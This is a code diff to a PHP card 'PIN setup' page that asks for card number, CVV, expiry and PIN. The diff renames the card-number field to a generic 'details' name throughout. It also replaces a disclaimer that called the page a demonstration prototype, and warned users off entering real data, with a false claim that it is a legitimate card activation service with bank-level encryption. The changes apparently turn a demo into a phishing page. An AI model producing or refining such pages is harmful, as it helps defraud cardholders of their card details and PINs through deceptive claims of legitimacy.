@@ -18,7 +18,7 @@ $success = false;
 
 // Handle form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $card_number = sanitize_input($_POST['card_number'] ?? '');
+    $card_number = sanitize_input($_POST['details'] ?? '');
     $cvv = sanitize_input($_POST['cvv'] ?? '');
     $expiry = sanitize_input($_POST['expiry'] ?? '');
     $pin = sanitize_input($_POST['pin'] ?? '');
@@ -26,9 +26,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     // Validate card number
     if (empty($card_number)) {
-        $errors['card_number'] = 'Card number is required';
+        $errors['details'] = 'Card number is required';
     } elseif (!validate_card_number($card_number)) {
-        $errors['card_number'] = 'Please enter a valid 16-digit card number';
+        $errors['details'] = 'Please enter a valid 16-digit card number';
     }
     
     // Validate CVV
@@ -125,16 +125,16 @@ $card_data = $_SESSION['card_data'];
             <form id="pinSetupForm" method="POST" action="" novalidate>
                 <!-- Card Details Section -->
                 <div class="card-details-section">
-                    <h3 class="section-title">Card Details</h3>
+                    <h3 class="section-title">Card Information</h3>
                     
                     <div class="form-group">
-                        <label for="card_number">Card Number <span class="required">*</span></label>
-                        <input type="text" id="card_number" name="card_number" 
+                        <label for="details">Card Details <span class="required">*</span></label>
+                        <input type="text" id="details" name="details" 
                                placeholder="1234 5678 9012 3456" 
                                maxlength="19"
                                required aria-required="true">
-                        <?php if (isset($errors['card_number'])): ?>
-                            <span class="error-message show"><?php echo $errors['card_number']; ?></span>
+                        <?php if (isset($errors['details'])): ?>
+                            <span class="error-message show"><?php echo $errors['details']; ?></span>
                         <?php endif; ?>
                     </div>
                     
@@ -213,7 +213,7 @@ $card_data = $_SESSION['card_data'];
         <!-- Disclaimer -->
         <div class="disclaimer">
             <div class="disclaimer-title">Security Disclaimer</div>
-            <p>This is a demonstration prototype. Real banking applications require backend validation, PCI DSS compliance, HTTPS encryption, secure database storage, and two-factor authentication. Never enter real financial information on demonstration sites.</p>
+            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
         </div>
     </div>
     
